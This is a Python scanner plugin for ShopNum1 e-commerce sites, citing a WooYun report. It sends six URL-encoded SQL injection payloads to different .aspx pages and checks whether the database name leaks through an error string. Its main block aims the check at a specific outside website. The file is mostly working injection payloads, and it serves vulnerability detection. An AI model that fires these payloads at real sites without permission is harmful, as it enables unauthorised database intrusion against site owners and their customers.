#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = p4ny
#_PlugName_ = ShopNum1 6处高危SQL注入漏洞
#__Refer___ = http://www.wooyun.org/bugs/wooyun-2015-0121337
import re
def assign(service, arg):
    if service == 'shopnum1':
        return True, arg
def audit(arg):
    payloads = [
    'VideoDetail.aspx?Guid=111%27%20and%20(db_name()%2BCHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(118)%2BCHAR(117)%2BCHAR(108))>0--',
    'VideoSearchList.aspx?VideoCategoryID=1%20and%20(db_name()%2BCHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(118)%2BCHAR(117)%2BCHAR(108))%3E0--',
    'ProductListCategory.aspx?ProductCategoryID=1%20and%20(db_name()%2BCHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(118)%2BCHAR(117)%2BCHAR(108))%3E0--',
    'ArticleDetail.aspx?guid=1%27%20and%20(db_name()%2BCHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(118)%2BCHAR(117)%2BCHAR(108))>0--',
    'ArticleDetailNew.aspx?guid=1%27%20and%20(db_name()%2BCHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(118)%2BCHAR(117)%2BCHAR(108))>0--',
    'HelpList.aspx?Guid=1%27%20and%20(db_name()%2BCHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(118)%2BCHAR(117)%2BCHAR(108))>0--']
    for payload in payloads:
        target = arg + payload
        code, head, res, errcode, _ = curl.curl2(target)
        if code == 200 and re.search("~testvul", res):
            security_hole(target)
            
if __name__ == '__main__':
    from dummy import *
    audit(assign('shopnum1', 'http://www.makemay.com/')[1])